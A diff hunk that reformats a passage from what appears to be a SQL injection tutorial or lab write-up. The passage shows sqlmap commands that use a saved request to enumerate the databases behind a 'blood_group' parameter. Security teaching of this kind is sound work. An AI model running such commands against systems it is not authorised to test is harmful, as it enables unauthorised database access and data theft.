@@ -266,12 +266,13 @@ blood_group=B%2B
 
 Now that we’ve identified a potentially vulnerable parameter, let’s jump into the sqlmap and use the following command:  
   
-sqlmap -r req.txt -p blood_group --dbs
+`sqlmap -r req.txt -p blood_group --dbs`
 
-**sqlmap -r <request_file> -p <vulnerable_parameter> --dbs**
+`sqlmap -r <request_file> -p <vulnerable_parameter> --dbs`
+
 Here we have used two flags: -r to read the file, -p to supply the vulnerable parameter, and --dbs to enumerate the database.
 
-Database Enumeration
+Database Enumeration:
 
 
 nare@nare$ sqlmap -r req.txt -p blood_group --dbs
